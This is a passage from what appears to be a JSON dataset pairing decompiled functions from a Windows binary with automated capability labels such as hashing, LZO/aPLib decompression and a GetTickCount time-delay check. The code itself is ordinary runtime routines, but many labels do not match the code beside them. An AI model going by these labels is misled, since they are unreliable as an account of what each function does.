        "decompiled_code": "\nint32_t * __fastcall fcn.00403664(uint32_t param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = param_1 >> 2;\n    do {\n        if (uVar1 == 0) {\ncode_r0x00403694:\n            param_1 = param_1 & 3;\n            if (((param_1 != 0) && (*in_EAX == *param_2)) &&\n               ((param_1 == 1 ||\n                ((*(in_EAX + 1) == *(param_2 + 1) && ((param_1 == 2 || (*(in_EAX + 2) == *(param_2 + 2))))))))) {\n                return NULL;\n            }\n            return in_EAX;\n        }\n        if (*in_EAX != *param_2) {\n            return in_EAX;\n        }\n        if (uVar1 == 1) {\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n            goto code_r0x00403694;\n        }\n        if (in_EAX[1] != param_2[1]) {\n            return in_EAX;\n        }\n        in_EAX = in_EAX + 2;\n        param_2 = param_2 + 2;\n        uVar1 = uVar1 - 2;\n    } while( true );\n}\n",
        "token_count": 322
    },
    "004051b0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004051b0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "004056fc": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004056fc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "004095dc": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004095dc(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    \n    bVar4 = param_1 == 0;\n    iVar1 = param_1;\n    puVar3 = param_2;\n    if (!bVar4) {\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar4 = *puVar3 == '\\0';\n            puVar3 = puVar3 + 1;\n        } while (!bVar4);\n        if (bVar4) {\n            iVar1 = iVar1 + 1;\n        }\n    }\n    for (uVar2 = param_1 - iVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = param_1 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    *in_EAX = 0;\n    return;\n}\n",
        "token_count": 335
    },
    "00418c50": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418c50(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0x14) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0x14) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.00418c9c();\n            uVar2 = *(in_EAX + 0x14);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 400
    },
    "0041b0b0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b0b0(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0xc) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0xc) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041b0fc();\n            uVar2 = *(in_EAX + 0xc);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "00404fc8": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404fc8(uint param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    int16_t *piVar2;\n    \n    arg_8h = 0;\n    piVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar2 != 0; piVar2 = piVar2 + 4) {\n            if (piVar2[1] == 0) {\ncode_r0x00404ff1:\n                piVar2 = piVar2 + 1;\n                break;\n            }\n            if (piVar2[2] == 0) {\ncode_r0x00404fee:\n                piVar2 = piVar2 + 1;\n                goto code_r0x00404ff1;\n            }\n            if (piVar2[3] == 0) {\n                piVar2 = piVar2 + 1;\n                goto code_r0x00404fee;\n            }\n        }\n        arg_8h = piVar2 - param_2 >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00404da0(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00404ec0(arg_8h),  -1 < iVar1)) {\n        fcn.00404e90();\n    }\n    else {\n        fcn.004054ec();\n        fcn.00404ec0(arg_8h);\n        fcn.004054ec();\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00405028": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405028(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4) >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00404da0(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00404ec0(arg_8h),  -1 < iVar1)) {\n        fcn.00404e90();\n    }\n    else {\n        fcn.004054ec();\n        fcn.00404ec0(arg_8h);\n        fcn.004054ec();\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "004055bc": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n\nvoid __fastcall fcn.004055bc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX != param_2) {\n        if ((param_2 == 0) || (*(param_2 + -4) >> 1 == 0)) {\n            iVar1 = *in_EAX;\n            if (iVar1 != 0) {\n                *in_EAX = 0;\n                sub.oleaut32.dll_SysFreeString(iVar1);\n            }\n            return;\n        }\n        iVar1 = sub.oleaut32.dll_SysReAllocStringLen();\n        if (iVar1 == 0) {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402ddc();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00405694": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n\nvoid __fastcall fcn.00405694(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    uVar3 = 0;\n    piVar4 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar4 != 0; piVar4 = piVar4 + 2) {\n            if (*(piVar4 + 2) == 0) {\ncode_r0x004056bd:\n                piVar4 = piVar4 + 2;\n                break;\n            }\n            if (*(piVar4 + 1) == 0) {\ncode_r0x004056ba:\n                piVar4 = piVar4 + 2;\n                goto code_r0x004056bd;\n            }\n            if (*(piVar4 + 6) == 0) {\n                piVar4 = piVar4 + 2;\n                goto code_r0x004056ba;\n            }\n        }\n        uVar3 = piVar4 - param_2 >> 1;\n    }\n    if (uVar3 == 0) {\n        iVar2 = *in_EAX;\n        if (iVar2 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar2);\n        }\n        return;\n    }\n    iVar2 = sub.oleaut32.dll_SysAllocStringLen(param_2, uVar3);\n    if (iVar2 != 0) {\n        iVar1 = *param_2;\n        *param_2 = iVar2;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n        return;\n    }\n    if (*0x493008 != NULL) {\n        (**0x493008)();\n    }\n    fcn.00402ddc();\n    return;\n}\n",
        "token_count": 442
    },
    "004056f0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.004056f0(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0041735c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041735c(code *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    do {\n        var_10h = var_8h + in_ECX >> 1;\n        uVar3 = var_8h;\n        uVar4 = in_ECX;\n        do {\n            while (iVar2 = (*arg_8h)(),  iVar2 < 0) {\n                uVar3 = uVar3 + 1;\n            }\n            while (iVar2 = (*arg_8h)(),  0 < iVar2) {\n                uVar4 = uVar4 - 1;\n            }\n            if (uVar3 <= uVar4) {\n                fcn.00417064();\n                uVar1 = uVar4;\n                if ((uVar3 != var_10h) && (uVar1 = var_10h,  uVar4 == var_10h)) {\n                    uVar1 = uVar3;\n                }\n                var_10h = uVar1;\n                uVar3 = uVar3 + 1;\n                uVar4 = uVar4 - 1;\n            }\n        } while (uVar3 <= uVar4);\n        if (var_8h < uVar4) {\n            fcn.0041735c(arg_8h);\n        }\n        var_8h = uVar3;\n    } while (uVar3 < in_ECX);\n    return;\n}\n",
        "token_count": 396
    },
    "0040a924": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a924(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    \n    ppcVar2 = arg_8h + -4;\n    pcVar1 = *ppcVar2;\n    while (**ppcVar2 == *(arg_8h + -5)) {\n        *ppcVar2 = *ppcVar2 + 1;\n    }\n    *(arg_8h + -0xc) = *ppcVar2 + (1 - pcVar1);\n    return;\n}\n",
        "token_count": 126
    },
    "00418eb4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418eb4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.0041bb4c();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0041bb20();\n            if ((*(iVar2 + 0x24) & 4) != 0) {\n                iVar2 = fcn.00405c9c();\n                fcn.00405e58(iVar2 + 1);\n                uVar3 = fcn.0041bb20();\n                iVar2 = fcn.00405c9c();\n                *(*(arg_8h + -4) + -4 + iVar2 * 4) = uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "0041a7c0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a7c0(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.00418834();\n        if (cVar1 != '\\0') break;\n        fcn.0041a874();\n    }\n    fcn.004198f0();\n    return;\n}\n",
        "token_count": 81
    },
    "0041a818": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a818(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.00418834();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.00418c2c();\n        if (cVar1 - 2U < 3) {\n            fcn.0041a874();\n        }\n        fcn.0041ac80();\n        while( true ) {\n            cVar1 = fcn.00418834();\n            if (cVar1 != '\\0') break;\n            fcn.0041aa24();\n        }\n        fcn.004198f0();\n    }\n    fcn.004198f0();\n    return;\n}\n",
        "token_count": 169
    },
    "0043cd7c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043cd7c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    \n    iVar1 = fcn.0040d2dc();\n    if (iVar1 != 0) {\n        fcn.00405304();\n    }\n    return unaff_EBX & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 90
    },
    "00447a00": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447a00(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00413a6c();\n    fcn.0044502c();\n    iVar1 = *(*(arg_8h + -8) + 8);\n    fcn.00413abc(&var_20h, \n                 ((*(iVar1 + 0x58) - *(iVar1 + 0x50)) + *(*(*(arg_8h + -4) + 0x30) + 0x4c)) - *(*(arg_8h + -4) + 0x4c));\n    fcn.00444edc();\n    return;\n}\n",
        "token_count": 183
    },
    "004790a4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004790cb)\n\nvoid fcn.004790a4(void)\n\n{\n    int32_t *in_EAX;\n    code *pcVar1;\n    code **ppcVar2;\n    code **ppcVar3;\n    int32_t iVar4;\n    \n    in_EAX[1] = 0;\n    pcVar1 = fcn.004791d4();\n    ppcVar2 = fcn.00479198();\n    if (ppcVar2 == NULL) {\n        fcn.004791d8();\n        iVar4 = *in_EAX;\n        *(iVar4 + 0x14) = 0x36;\n        *(iVar4 + 0x18) = 0;\n        (***in_EAX)();\n    }\n    *ppcVar2 = fcn.0047858c;\n    iVar4 = 1;\n    ppcVar2[1] = fcn.004786bc;\n    ppcVar2[2] = fcn.0047875c;\n    ppcVar2[3] = fcn.00478830;\n    ppcVar2[4] = fcn.00478914;\n    ppcVar2[5] = fcn.0047897c;\n    ppcVar2[6] = 0x4789e4;\n    ppcVar2[7] = fcn.00478cd4;\n    ppcVar2[8] = fcn.00478e18;\n    ppcVar2[9] = fcn.00478f60;\n    ppcVar2[10] = 0x47906c;\n    ppcVar2[0xc] = 0x3b9aca00;\n    ppcVar2[0xb] = pcVar1;\n    ppcVar3 = ppcVar2 + 0xe;\n    do {\n        iVar4 = iVar4 + -1;\n        *ppcVar3 = NULL;\n        ppcVar3[2] = NULL;\n        ppcVar3 = ppcVar3 + -1;\n    } while (-1 < iVar4);\n    ppcVar2[0x11] = NULL;\n    ppcVar2[0x12] = NULL;\n    ppcVar2[0x13] = 0x54;\n    in_EAX[1] = ppcVar2;\n    return;\n}\n",
        "token_count": 523
    },
    "00403a3c": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00403a3c(void)\n\n{\n    return;\n}\n",
        "token_count": 17
    },
    "00430560": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00430560(uint16_t param_1, uint32_t param_2)\n\n{\n    float fVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    double in_stack_ffffff78;\n    uint8_t in_stack_ffffff88;\n    double dVar5;\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack40;\n    uint uStack36;\n    ulong uStack32;\n    \n    if (param_1 != 0) {\n        if (*0x43077c < (param_2 & 0xffff)) {\n            fVar1 = ((param_2 & 0xffff) + param_1) - ((param_2 & 0xffff) * param_1 + *0x43077c) / *0x430774;\n        }\n        else {\n            fVar1 = ((param_2 & 0xffff) * (param_1 + 0xf0) + *0x43077c) / *0x430774;\n        }\n        uStack32 = fVar1;\n        dVar5 = (param_2 & 0xffff) * 2 - uStack32;\n        uStack36 = dVar5 >> 0x20;\n        uStack40 = SUB84(dVar5, 0);\n        dVar5 = (in_EAX & 0xffff) + *0x430780;\n        iVar2 = fcn.00430444(SUB84(dVar5, 0), dVar5 >> 0x20, uStack32, uStack32._4_4_, uStack40, uStack36);\n        dVar5 = (iVar2 * 0xff + *0x43077c) / *0x430774;\n        fcn.00430444(SUB84(in_EAX & 0xffff, 0), (in_EAX & 0xffff) >> 0x20, uStack56, uStack52, uStack64, uStack64._4_4_)\n        ;\n        in_stack_ffffff78 = (in_EAX & 0xffff) - *0x430780;\n        iVar2 = fcn.00430444(SUB84(in_stack_ffffff78, 0), in_stack_ffffff78 >> 0x20, uStack32, uStack32._4_4_, \n                             SUB84(dVar5, 0), dVar5 >> 0x20);\n        in_stack_ffffff88 = SUB81((iVar2 * 0xff + *0x43077c) / *0x430774, 0);\n    }\n    uVar3 = fcn.00430534(SUB84(in_stack_ffffff78, 0), in_stack_ffffff78 >> 0x20);\n    fcn.00430534(SUB84(in_stack_ffffff78, 0), in_stack_ffffff78 >> 0x20);\n    uVar4 = fcn.00430534(SUB84(in_stack_ffffff78, 0), in_stack_ffffff78 >> 0x20);\n    return uVar3 & 0xff | in_stack_ffffff88 << 8 | (uVar4 & 0xff) << 0x10;\n}\n",
        "token_count": 731
    },
    "0043099c": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043099c(uint32_t arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0042074c();\n    uVar2 = fcn.0042074c();\n    var_2ch = *arg_ch;\n    var_28h = arg_ch[1];\n    var_24h._0_2_ = (uVar1 & 0xff) << 8;\n    var_20h._0_2_ = (uVar1 >> 0x10 & 0xff) << 8;\n    var_24h._2_2_ = (uVar1 >> 8 & 0xff) << 8;\n    var_20h._2_2_ = 0;\n    var_1ch = arg_ch[2];\n    var_18h = arg_ch[3];\n    var_14h._0_2_ = (uVar2 & 0xff) << 8;\n    var_10h._0_2_ = (uVar2 >> 0x10 & 0xff) << 8;\n    var_14h._2_2_ = (uVar2 >> 8 & 0xff) << 8;\n    var_10h._2_2_ = 0;\n    var_ch = 0;\n    var_8h = 1;\n    uVar3 = fcn.00421c8c(&var_2ch, 2, &var_ch, 1, *((arg_8h & 0xff) * 4 + 0x491380));\n    sub.msimg32.dll_GradientFill(uVar3);\n    return;\n}\n",
        "token_count": 472
    },
    "0047c884": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0047c884(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    \n    iVar1 = arg_8h >> 1;\n    if (iVar1 < 0) {\n        iVar1 = iVar1 + ((arg_8h & 1) != 0);\n    }\n    return (in_ECX * 0xff + iVar1) / arg_8h;\n}\n",
        "token_count": 103
    },
    "0047c8a8": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0047c8a8(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    return (in_ECX * 0x1fe + arg_8h + 0xff) / (arg_8h * 2);\n}\n",
        "token_count": 66
    },
    "004829e8": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004829e8(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    char *in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((((in_ECX < 0xc) || (*in_EDX != 'A')) || (in_EDX[1] != 'd')) ||\n       (((in_EDX[2] != 'o' || (in_EDX[3] != 'b')) || (in_EDX[4] != 'e')))) {\n        iVar6 = *in_EAX;\n        *(iVar6 + 0x14) = 0x4e;\n        *(iVar6 + 0x18) = in_ECX + arg_8h;\n        (**(*in_EAX + 4))();\n    }\n    else {\n        uVar1 = in_EDX[7];\n        uVar2 = in_EDX[8];\n        uVar3 = in_EDX[9];\n        uVar4 = in_EDX[10];\n        uVar5 = in_EDX[0xb];\n        iVar6 = *in_EAX;\n        *(iVar6 + 0x18) = in_EDX[5] * 0x100 + in_EDX[6];\n        *(iVar6 + 0x1c) = uVar1 * 0x100 + uVar2;\n        *(iVar6 + 0x20) = uVar3 * 0x100 + uVar4;\n        *(iVar6 + 0x24) = uVar5;\n        *(*in_EAX + 0x14) = 0x4c;\n        (**(*in_EAX + 4))();\n        in_EAX[0x49] = 1;\n        *(in_EAX + 0x4a) = uVar5;\n    }\n    return;\n}\n",
        "token_count": 467
    },
    "00489464": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00489464(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    iVar4 = in_EAX[3];\n    if (param_1 == 0) {\n        piVar1 = in_EAX[8];\n        *(*piVar1 + 0x14) = 0x28;\n        (***piVar1)();\n    }\n    iVar4 = iVar4 + param_1;\n    uVar5 = (param_2 & (1 << (param_1 & 0x1f)) - 1U) << (0x18U - iVar4 & 0x1f) | in_EAX[2];\n    while( true ) {\n        if (iVar4 < 8) {\n            in_EAX[2] = uVar5;\n            in_EAX[3] = iVar4;\n            return 1;\n        }\n        puVar2 = *in_EAX;\n        *in_EAX = *in_EAX + 1;\n        uVar6 = uVar5 >> 0x10 & 0xff;\n        *puVar2 = uVar6;\n        piVar1 = in_EAX + 1;\n        *piVar1 = *piVar1 + -1;\n        if ((*piVar1 == 0) && (iVar3 = fcn.0048943c(),  iVar3 == 0)) break;\n        if (uVar6 == 0xff) {\n            puVar2 = *in_EAX;\n            *in_EAX = *in_EAX + 1;\n            *puVar2 = 0;\n            piVar1 = in_EAX + 1;\n            *piVar1 = *piVar1 + -1;\n            if ((*piVar1 == 0) && (iVar3 = fcn.0048943c(),  iVar3 == 0)) {\n                return 0;\n            }\n        }\n        uVar5 = uVar5 << 8;\n        iVar4 = iVar4 + -8;\n    }\n    return 0;\n}\n",
        "token_count": 499
    },
    "004e79b0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004e79b0(int32_t *param_1)\n\n{\n    uint8_t **ppuVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uStack4;\n    \n    ppuVar1 = *param_1;\n    puVar3 = ppuVar1[1];\n    while (0x7 < puVar3) {\n        uStack4 = **ppuVar1;\n        *ppuVar1 = *ppuVar1 + 1;\n        puVar3 = ppuVar1[1] + -8;\n        ppuVar1[2] = ppuVar1[2] << 8 | uStack4;\n        ppuVar1[1] = puVar3;\n    }\n    uVar2 = ppuVar1[2] >> (8U - ppuVar1[1] & 0x1f) & 0xfffe00;\n    if (uVar2 < param_1[9]) {\n        uVar4 = *((uVar2 >> 0x10) + param_1[0x23]);\n    }\n    else if (uVar2 < param_1[0xb]) {\n        uVar4 = 10 - (uVar2 < param_1[10]);\n    }\n    else if (uVar2 < param_1[0xc]) {\n        uVar4 = 0xb;\n    }\n    else if (uVar2 < param_1[0xd]) {\n        uVar4 = 0xc;\n    }\n    else if (uVar2 < param_1[0xe]) {\n        uVar4 = 0xd;\n    }\n    else {\n        uVar4 = 0xf - (uVar2 < param_1[0xf]);\n    }\n    *(*param_1 + 4) = *(*param_1 + 4) + uVar4;\n    return *(param_1[0x22] + ((uVar2 - param_1[uVar4] >> (0x18U - uVar4 & 0x1f)) + param_1[uVar4 + 0x11]) * 4);\n}\n",
        "token_count": 486
    },
    "004036d4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004036d4(void)\n\n{\n    uint *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = 0xffffffff;\n    if ((*(in_EAX + 1) < 0xd7b1) || (0xd7b3 < *(in_EAX + 1))) {\n        fcn.00402e60();\n    }\n    else {\n        uVar1 = sub.kernel32.dll_GetFileSize(*in_EAX, 0);\n        if (uVar1 == 0xffffffff) {\n            fcn.00402e70();\n        }\n        else {\n            uVar1 = uVar1 / in_EAX[2];\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 160
    },
    "004049f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004049f0(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t **in_FS_OFFSET;\n    \n    if (*0x4957c8 != NULL) {\n        ppiVar1 = *in_FS_OFFSET;\n        if (*0x4957c8 == ppiVar1) {\n            *in_FS_OFFSET = **0x4957c8;\n            return;\n        }\n        for (; ppiVar1 != 0xffffffff; ppiVar1 = *ppiVar1) {\n            if (*ppiVar1 == *0x4957c8) {\n                *ppiVar1 = **0x4957c8;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00406b44": {
        "rules": [
